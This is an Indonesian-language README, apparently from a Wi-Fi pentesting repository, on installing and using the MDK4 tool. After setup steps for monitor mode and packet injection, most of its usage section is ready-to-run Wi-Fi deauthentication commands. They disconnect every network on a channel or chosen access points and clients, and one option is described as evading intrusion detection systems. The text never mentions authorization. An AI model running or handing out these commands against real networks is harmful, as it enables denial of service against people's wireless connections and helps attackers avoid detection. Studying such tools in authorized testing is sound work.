# MDK4

![MDK4](https://github.com/fixploit03/Pentest-WiFi/blob/main/tools/mdk4/img/mdk3_4.jpg)

## Instalasi

Kali Linux:

1. Menggunakan package manager (`apt`):

   ```
   sudo apt-get update
   sudo apt-get install mdk4 aircrack-ng
   ```

2. Melalui compile dari source:
   
   ```
   sudo apt-get update
   sudo apt-get install pkg-config libnl-3-dev libnl-genl-3-dev libpcap-dev git
   git clone https://github.com/aircrack-ng/mdk4
   cd mdk4
   make
   sudo make install
   ```

## Setup Adapter Wi-Fi

1. Pasang adapter Wi-Fi ke laptop/PC.
2. Pada aplikasi VirtualBox klik tab `Devices` -> `USB` -> `Jenis/merek`.
3. Pastikan checkbox nya sudah tercentang.
4. Buka terminal.
5. Ketikkan `iwconfig`, pastikan nama interface `wlan0` muncul.
6. Kalau sudah muncul, aktifkan mode monitor menggunakan:

   ```
   sudo airmon-ng check kill
   sudo airmon-ng start wlan0
   ```
7. Cek kembali menggunakan `iwconfig` apakah mode interfacenya sudah berubah menjadi mode `Monitor`.
8. Cek packet injection menggunakan:

   ```
   sudo aireplay-ng --test wlan0
   ```
   
## Penggunaan

**1. Scan Wi-Fi:**

```
sudo airodump-ng [interface]
```

**2. Jalankan MDK4:**

   1. Deauth semua Wi-Fi yang ada di channel tertentu:

      ```
      sudo mdk4 [interface] d -c [channel]
      ```
   2. Blacklist mode:

      ```
      sudo mdk4 [interface] d -b [file_blacklist] -c [channel]
      ```
      
      - Blacklist mode hanya melakukan deauth terhadap MAC address yang ada di file `[file_blacklist]`.
      - File `[file_blacklist]` berisi MAC address AP (BSSID) atau client yang akan di-deauth.
   3. Whitelist mode:

      ```
      sudo mdk4 [interface] d -w [file_whitelist] -c [channel]
      ```

      - Whitelist mode melakukan deauth terhadap semua MAC address, kecuali yang ada di file `[file_whitelist]`.
      - File `[file_whitelist]` berisi MAC address AP (BSSID) atau client yang akan dilindungi dari deauth.
   4. Speed Control:

      ```
      sudo mdk4 [interface] d -s [speed] -c [channel]
      ```

      Speed control untuk mengatur kecepatan pengiriman paket dalam packets per second (pps). Tanpa opsi `-s`, defaultnya unlimited (tergantung kemampuan hardware).
   5. Mode stealth:

      ```
      sudo mdk4 [interface] d -c [channel] -x
      ```

      Opsi `-x` mengaktifkan IDS stealth dengan menyesuaikan sequence numbers paket untuk menghindari deteksi oleh Intrusion Detection System.
   6. Target AP berdasarkan ESSID:

      ```
      sudo mdk4 [interface] d -E [essid] -c [channel]
      ```
   7. Target AP berdasarkan BSSID:

      ```
      sudo mdk4 [interface] d -B [bssid] -c [channel]
      ```
   8. Target client spesifik:

      ```
      sudo mdk4 [interface] d -S [mac_client] -c [channel]
      ```
   9. Whitelist station spesifik:

      ```
      sudo mdk4 [interface] d -W [mac_client] -c [channel]
      ```

      Whitelist station spesifik akan melakukan deauth terhadap semua client, kecuali client `[mac_client]`.

## Video Demonstrasi

[https://youtu.be/eO44GfS2LO8?si=fDtXCxNIUE0_k-1Z](https://youtu.be/eO44GfS2LO8?si=fDtXCxNIUE0_k-1Z)
